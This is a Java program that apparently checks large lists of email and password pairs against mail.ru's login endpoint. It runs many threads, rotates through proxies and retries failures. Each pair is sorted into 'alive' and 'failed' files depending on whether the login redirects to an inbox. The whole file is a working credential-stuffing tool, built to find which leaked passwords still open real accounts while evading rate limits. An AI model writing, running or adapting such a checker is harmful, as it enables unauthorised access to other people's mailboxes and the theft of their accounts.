package com.fdt.snippetutils;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.Authenticator;
import java.net.HttpURLConnection;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;

import javax.annotation.PostConstruct;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.apache.log4j.Logger;
import org.apache.log4j.xml.DOMConfigurator;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.context.ApplicationContext;

import com.fdt.scrapper.proxy.ProxyConnector;
import com.fdt.scrapper.proxy.ProxyFactory;
import com.fdt.scrapper.task.ConfigManager;
import com.fdt.utils.Utils;

public class MailRuIsAliveChecker {

	private static final Logger log = Logger.getLogger(MailRuIsAliveChecker.class);


	private final static String MAIL_LIST_FILE_PATH_LABEL = "mail_list_file_path";

	private final static String MAX_THREAD_COUNT_LABEL = "max_thread_count";

	private final String alivePath = "mail_ru_checker/mail_ru_alive.txt";
	private final String failedPath = "mail_ru_checker/mail_ru_failed.txt";

	private final String reCheckgPath = "mail_ru_checker/mail_ru_recheck.txt";

	private String mailListFilePath;

	@Autowired
	private ProxyFactory proxyFactory;
	
	@Autowired
	private ConfigManager configManager;

	private PageCheckerSaverThread saverThread = new PageCheckerSaverThread();

	private AtomicInteger currentThreadCount = new AtomicInteger(0);
	private Integer maxThreadCount = 1;

	private Long sleepTime = 50L;


	public static void main(String[] args) {
		DOMConfigurator.configure("log4j_mailru.xml");
		try{
			ApplicationContext ctx = SpringApplication.run(MailRuIsAliveChecker.class, args);

			System.out.println("Let's inspect the beans provided by Spring Boot:");

			String[] beanNames = ctx.getBeanDefinitionNames();
			Arrays.sort(beanNames);
			for (String beanName : beanNames) {
				System.out.println(beanName);
			}

			MailRuIsAliveChecker checker = new MailRuIsAliveChecker();
			checker.execute();
		}catch(Exception e){
			log.error("Error occured during replacer executor: ", e);
			e.printStackTrace();
			System.exit(-1);
		}
	}

	public MailRuIsAliveChecker() throws IOException {
		super();
	}

	@PostConstruct
	private void init(){
		this.mailListFilePath = ConfigManager.getInstance().getProperty(MAIL_LIST_FILE_PATH_LABEL);

		this.maxThreadCount = Integer.valueOf(ConfigManager.getInstance().getProperty(MAX_THREAD_COUNT_LABEL));

	}

	private void execute() throws IOException, InterruptedException{

		List<String> mails= Utils.loadFileAsStrList(this.mailListFilePath);
		List<String> mailsRetained = Utils.loadFileAsStrList(this.mailListFilePath);

		List<String> mailAlive = Utils.loadFileAsStrList(this.alivePath);
		List<String> mailFailed = Utils.loadFileAsStrList(this.failedPath);

		List<String> mailRecheked;

		mailsRetained.retainAll(mailAlive);

		mails.removeAll(mailsRetained);

		mailsRetained = Utils.loadFileAsStrList(this.mailListFilePath);

		mailsRetained.retainAll(mailFailed);

		mails.removeAll(mailsRetained);

		File reCheckFile = new File(this.reCheckgPath);
		reCheckFile.delete();

		do{
			while(mails.size() > 0)
			{
				String[] mailInfo = mails.get(0).split(";",2);
				if(currentThreadCount.get() < maxThreadCount && mailInfo.length == 2){
					MailRuCheckerThread rplcrThrd = new MailRuCheckerThread(mailInfo[0], mailInfo[1], this, proxyFactory);
					mails.remove(0);
					rplcrThrd.start();
				}else{
					Thread.sleep(1L);
				}
			}
			saverThread.saveResults();
			mails.addAll(Utils.loadFileAsStrList(this.reCheckgPath));
			reCheckFile.delete();
		}while(mails.size() > 0 || currentThreadCount.get() > 0);

		while( currentThreadCount.get() > 0){
			Thread.sleep(sleepTime);
		}

		saverThread.saveResults();
	}

	public class MailRuCheckerThread extends Thread
	{
		private final String mail;
		private final String password;
		private MailRuIsAliveChecker checker;
		private ProxyFactory proxyFactory;

		public MailRuCheckerThread(String mail, String password, MailRuIsAliveChecker checker, ProxyFactory proxyFactory) {
			super();
			this.mail = mail;
			this.password = password;
			this.checker = checker;
			this.proxyFactory = proxyFactory;
		}

		public void start(){
			this.checker.incThrdCnt();
			super.start();
		}

		public void run()
		{
			ProxyConnector proxyConnector = null;
			CheckedResult result = new CheckedResult(mail, password);
			int repeatCount = 0;

			try{
				boolean isErrorExist = false;

				do{
					repeatCount++;
					isErrorExist = false;
					proxyConnector = proxyFactory.getRandomProxyConnector();

					String proxyTypeStr = ConfigManager.getInstance().getProperty("proxy_type");
					Proxy proxy = null;

					try{
						log.trace("Starting checking url");
						proxy = proxyConnector.getConnect(proxyTypeStr);
						result.setAlive(checkMail4Live("https://auth.mail.ru/cgi-bin/auth?from=splash", mail, password, proxy));
					}
					catch(Exception e){
						result.setError(true);
						isErrorExist = true;
						log.warn("Error occured during checking URL: " + mail, e);
					}
					finally{
						if(proxyConnector != null){
							proxyFactory.releaseProxy(proxyConnector);
							proxyConnector = null;
						}
					}
				}
				while(isErrorExist && repeatCount <= 10);
			}finally{
				saverThread.addResult(result);
				checker.decThrdCnt();
			}
		}
	}

	private boolean checkMail4Live(String site, String mail, String password, Proxy proxy) throws Exception {
		HttpURLConnection conn = null;
		try{
			//post news
			URL url = new URL(site);
			HttpURLConnection.setFollowRedirects(false);
			conn = (HttpURLConnection) url.openConnection(proxy);
			log.trace("Connection created.");
			conn.setReadTimeout(120000);
			conn.setConnectTimeout(120000);
			conn.setRequestMethod("POST");
			conn.setDoInput(true);
			conn.setDoOutput(true);

			conn.addRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0"); 
			conn.setRequestProperty("Accept-Language", "en-US,en;q=0.9,fr;q=0.5,de;q=0.5,es;q=0.5,it;q=0.5,nl;q=0.5,ru;q=0.3");
			conn.setRequestProperty("Accept", "application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*");
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			conn.setRequestProperty("Host", site);

			ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(5);
			nameValuePairs.add(new BasicNameValuePair("Domain", "mail.ru"));
			nameValuePairs.add(new BasicNameValuePair("Login", mail));
			nameValuePairs.add(new BasicNameValuePair("Password", password));
			nameValuePairs.add(new BasicNameValuePair("new_auth_form", "1"));
			nameValuePairs.add(new BasicNameValuePair("saveauth","0"));

			OutputStream os = conn.getOutputStream();
			BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
			writer.write(getQuery(nameValuePairs));
			writer.flush();
			writer.close();
			os.close();

			int code = conn.getResponseCode();

			// Execute HTTP Post Request
			Map<String,List<String>> respHeader = conn.getHeaderFields();
			List<String> location = respHeader.get("Location");
			String locationStr = location.toString();
			if(location != null && location.toString().contains("https://e.mail.ru/messages/inbox/?back=1")){
				return true;
			}else{
				return false;
			}
		}catch(Exception e){
			throw e;
		}finally{
			if(conn != null){
				conn.disconnect();
			}
		}
	}

	private StringBuffer getResponseAsString(HttpURLConnection conn)
			throws IOException {
		InputStream is = conn.getInputStream();

		BufferedReader br = new BufferedReader(new InputStreamReader(is));

		String line;
		StringBuffer responseStr = new StringBuffer();
		while ((line = br.readLine()) != null) {
			responseStr.append(line);
		}
		br.close();
		is.close();
		return responseStr;
	}

	private class PageCheckerSaverThread {

		private final Integer BUFFER_SIZE = 100;

		private ArrayList<CheckedResult> results = new ArrayList<CheckedResult>();

		protected PageCheckerSaverThread(){
			super();
		}

		public synchronized void addResult(CheckedResult result){
			synchronized (results) {
				results.add(result);
			}
			if(results.size() >= BUFFER_SIZE){
				saveResults();
			}
		}

		private synchronized void saveResults() {

			StringBuffer aliveLines = new StringBuffer();
			StringBuffer invalidLines = new StringBuffer();
			StringBuffer recheckLines = new StringBuffer();

			ArrayList<CheckedResult> buffer = null;

			buffer = new ArrayList<>(results);
			results.clear();

			for(CheckedResult checkResult : buffer){

				String mailInfo = getMailInfoStr(checkResult);

				if(checkResult.isError()){
					recheckLines.append(mailInfo).append("\r\n");
				}else{				
					if(checkResult.isAlive()){
						aliveLines.append(mailInfo).append("\r\n");
					}else{
						invalidLines.append(mailInfo).append("\r\n");
					}
				}
			}

			try {
				log.debug("Saving to success list..");
				appendLinesToFile(aliveLines.toString(), new File(alivePath), true);
				log.debug("Saving to invalid list..");
				appendLinesToFile(invalidLines.toString(), new File(failedPath), true);
				log.debug("Saving to recheck list..");
				appendLinesToFile(recheckLines.toString(), new File(reCheckgPath), true);
			}
			catch (Exception e) {
				log.error("Error occured during getting checking results" , e);
			}
		}
	}

	private String getMailInfoStr(CheckedResult checkResult){
		StringBuffer result = new StringBuffer();
		result.append(checkResult.getMail()).append(";").append(checkResult.getPassword());
		return result.toString();

	}

	private class CheckedResult{
		private String mail;
		private String password;
		private boolean isAlive = false;

		private boolean error;

		public CheckedResult(String mail, String password) {
			super();
			this.mail = mail;
			this.password = password;
		}

		public boolean isAlive() {
			return isAlive;
		}

		public void setAlive(boolean isAlive) {
			this.isAlive = isAlive;
		}

		public boolean isError() {
			return error;
		}

		public void setError(boolean error) {
			this.error = error;
		}

		public String getMail() {
			return mail;
		}

		public String getPassword() {
			return password;
		}
	}


	private synchronized void appendLinesToFile(String line, File file, boolean append) {
		ArrayList<String> lines = new ArrayList<>();
		lines.add(line);
		appendLinesToFile(lines, file, append);
	}

	private  void appendLinesToFile(ArrayList<String> lines, File file, boolean append) {
		BufferedWriter bufferedWriter = null;
		try {
			//Construct the BufferedWriter object
			bufferedWriter = new BufferedWriter(new OutputStreamWriter(
					new FileOutputStream(file,append), "UTF8"));
			for(String line: lines){
				bufferedWriter.append(line);
			}
		} catch (IOException e) {
			log.warn(String.format("Error occured during saving collection string to file %s", file.getName()));
		} finally {
			//Close the BufferedWriter
			if (bufferedWriter != null) {
				try {
					bufferedWriter.flush();
					bufferedWriter.close();
				} catch (IOException e) {
					log.warn(String.format("Error occured closing file %s", file.getName()));
				}
			}
		}
	}

	private void incThrdCnt(){
		currentThreadCount.incrementAndGet();
		log.debug("Current thread count: " + currentThreadCount);
	}

	private void decThrdCnt(){
		currentThreadCount.decrementAndGet();
		log.debug("Current thread count: " + currentThreadCount);
	}

	public static String getQuery(List<NameValuePair> params) throws UnsupportedEncodingException
	{
		StringBuilder result = new StringBuilder();
		boolean first = true;

		for (NameValuePair pair : params)
		{
			if (first)
				first = false;
			else
				result.append("&");

			result.append(URLEncoder.encode(pair.getName(), "UTF-8"));
			result.append("=");
			result.append(URLEncoder.encode(pair.getValue(), "UTF-8"));
		}

		return result.toString();
	}
}

